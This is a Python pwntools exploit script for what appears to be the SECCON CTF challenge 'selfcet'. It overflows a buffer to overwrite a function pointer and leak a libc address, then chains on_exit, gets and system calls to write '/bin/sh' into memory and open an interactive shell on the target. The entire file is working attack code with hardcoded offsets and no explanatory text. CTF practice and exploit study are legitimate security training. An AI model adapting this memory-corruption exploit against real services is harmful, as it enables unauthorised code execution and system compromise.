from __future__ import division, print_function
import random
from pwn import *
import argparse
import time


context.log_level = 'error'

parser = argparse.ArgumentParser()
parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="target host"
        )
parser.add_argument(
        "--port",
        default=9999,
        help="target port"
        )
parser.add_argument(
        '--log',
        action='store_true'
        )
parser.add_argument(
        '--is-gaibu',
        action='store_true'
        )
args = parser.parse_args()


log = args.log
is_gaibu = args.is_gaibu
if is_gaibu:
    host = "selfcet.seccon.games"
    port = 9999
else:
    host = args.host
    port = args.port

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, b'\x00'))

r = remote(host, port)

def recvuntil(x, verbose=True):
    if type(x) == str:
        x = x.encode("ascii")
    s = r.recvuntil(x)
    if log and verbose:
        print(s)
    return s.strip(x)

def recv(n, verbose=True):
    s = r.recv(n)
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip(b'\n')

def sendline(s, verbose=True):
    if type(s) == str:
        s = s.encode("ascii")
    if log and verbose:
        print(s)
    r.sendline(s)

def send(s, verbose=True):
    if type(s) == str:
        s = s.encode("ascii")
    if log and verbose:
        print(s, end='')
    r.send(s)

def interactive():
    r.interactive()


####################################

def menu(choice):
    recvuntil(b':')
    sendline(str(choice))

# receive and send
def rs(s, new_line=True, r=b': '):
    recvuntil(r)
    #s = str(s)
    if new_line:
        sendline(s)
    else:
        send(s)

# send `s` after r
def sa(r, s, new_line=True):
    rs(s, new_line, r)

err_got = 0x0403ff8
warn_addr = 0x7ffff7eb2010
#0x7f51e6e590d0
warnx_addr = 0x7ffff7eb90d0
main = 0x401209

#warn_addr = int(input("warn_addr:"), 16)
payload1 = b"A"*0x20 + b"\x00"*0x20
payload1 += p64(100) # error
payload1 += p64(err_got) # status
payload1 += p64(warnx_addr)[:2]
wait_for_attach()
send(payload1)
#interactive()

recvuntil(b"xor: ")
libc_base = just_u64(recvline()) - 0x1211d0
print(hex(libc_base))

system_addr = libc_base + 0x50d60
#posix_spawn = libc_base + 0x113010
posix_spawn = libc_base + 0x113030
binsh = libc_base + 0x1d8698
on_exit = libc_base + 0x45610
gets = libc_base + 0x805a0

#payload2 = b"\x00"*0x20
#payload2 += p64(binsh) # error
#payload2 += p64(0x00404000) # status
##payload2 += p64(1) # status
#payload2 += p64(posix_spawn)
#send(payload2)

payload2 = b"\x00"*0x20
payload2 += p64(0) # error
payload2 += p64(main) # status
payload2 += p64(on_exit)
send(payload2)

wait_for_attach()
payload3 = b"A"*0x20 + b"\x00"*0x20
payload3 += p64(0) # error
payload3 += p64(0x00404000) # status
payload3 += p64(gets)
send(payload3)

import time
time.sleep(1)

sendline("/bin/sh")

wait_for_attach()
payload4 = b"\x00"*0x20
payload4 += p64(0) # error
payload4 += p64(0x00404000) # status
payload4 += p64(system_addr)
send(payload4)
interactive()
